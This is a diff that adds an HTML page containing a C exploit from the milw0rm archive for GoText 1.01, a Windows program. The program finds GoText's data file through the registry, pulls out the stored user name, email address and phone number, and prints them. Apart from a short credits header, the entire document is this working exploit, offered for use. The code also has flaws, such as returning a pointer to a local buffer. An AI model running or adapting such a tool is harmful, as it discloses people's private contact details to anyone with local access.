@@ -1,0 +1,156 @@
+<html>
+<head>
+<title>GoText 1.01 Local User Informations Disclosure Exploit</title>
+<pre>
+/*******************************************************************
+
+GoText 1.01 Local User Informations Disclosure Exploit by Kozan
+
+Application: GoText 1.01
+Vendor: StumbleInside Software - www.stumbleinside.com
+Vulnerable Description: GoText 1.01 discloses user informations
+to local users.
+
+
+Discovered &amp; Coded by: Kozan
+Credits to ATmaCA
+Web: www.netmagister.com
+Web2: www.spyinstructors.com
+Mail: kozan@netmagister.com
+
+*******************************************************************/
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+
+
+HKEY hKey;
+#define BUFSIZE 100
+char prgfiles[BUFSIZE];
+DWORD dwBufLen=BUFSIZE;
+LONG lRet;
+
+
+int adresal(char *FilePath,char *Str)
+{
+char kr;
+int Sayac=0;
+int Offset=-1;
+FILE *di;
+di=fopen(FilePath,&quot;rb&quot;);
+
+if( di == NULL )
+{
+fclose(di);
+return -1;
+}
+
+while(!feof(di))
+{
+Sayac++;
+for(int i=0;i&lt;strlen(Str);i++)
+{
+kr=getc(di);
+if(kr != Str[i])
+{
+if( i&gt;0 )
+{
+fseek(di,Sayac+1,SEEK_SET);
+}
+break;
+}
+if( i &gt; ( strlen(Str)-2 ) )
+{
+Offset = ftell(di)-strlen(Str);
+fclose(di);
+return Offset;
+}
+}
+}
+fclose(di);
+return -1;
+}
+
+
+char *oku(char *FilePath,char *Str)
+{
+
+FILE *di;
+char cr;
+int i=0;
+char Feature[500];
+
+int Offset = adresal(FilePath,Str);
+
+if( Offset == -1 )
+return &quot;&quot;;
+
+if( (di=fopen(FilePath,&quot;rb&quot;)) == NULL )
+return &quot;&quot;;
+
+fseek(di,Offset+strlen(Str),SEEK_SET);
+
+while(!feof(di))
+{
+cr=getc(di);
+if(cr == 0x0D)
+break;
+Feature[i] = cr;
+i++;
+}
+
+Feature[i] = '\0';
+fclose(di);
+return Feature;
+}
+
+
+int main()
+{
+	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion&quot;,0,KEY_QUERY_VALUE,&amp;hKey)
+== ERROR_SUCCESS)
+	{
+
+		lRet = RegQueryValueEx( hKey, &quot;ProgramFilesDir&quot;, NULL, NULL,(LPBYTE) prgfiles,
+&amp;dwBufLen);
+
+		if( (lRet != ERROR_SUCCESS) || (dwBufLen &gt; BUFSIZE) )
+		{
+			RegCloseKey(hKey);
+			printf(&quot;An error occured!\n&quot;);
+			exit(1);
+		}
+
+		RegCloseKey(hKey);
+
+	}
+	else
+	{
+		RegCloseKey(hKey);
+		printf(&quot;An error occured!\n&quot;);
+		exit(1);
+	}
+
+	strcat(prgfiles,&quot;\\GoText\\GoText.bin&quot;);
+
+	printf(&quot;GoText 1.01 Local User Informations Disclosure Exploit by Kozan\n&quot;);
+	printf(&quot;Credits to ATmaCA\n&quot;);
+	printf(&quot;www.netmagister.com - www.spyinstructors.com \n&quot;);
+	printf(&quot;kozan@netmagister.com \n\n&quot;);
+
+	char UserName[BUFSIZE], MailAddress[BUFSIZE], PhoneNumber[BUFSIZE];
+
+	strcpy(UserName,oku(prgfiles,&quot;MyName=&quot;));
+	strcpy(MailAddress,oku(prgfiles,&quot;MyEmail=&quot;));
+	strcpy(PhoneNumber,oku(prgfiles,&quot;MyNumber=&quot;));
+
+	printf(&quot;User Name    : %s\n&quot;,UserName);
+	printf(&quot;Mail Address : %s\n&quot;,MailAddress);
+	printf(&quot;Phone Number : %s\n&quot;,PhoneNumber);
+
+	return 0;
+}</pre>
+// milw0rm.com [2005-04-28]
+</html>
+
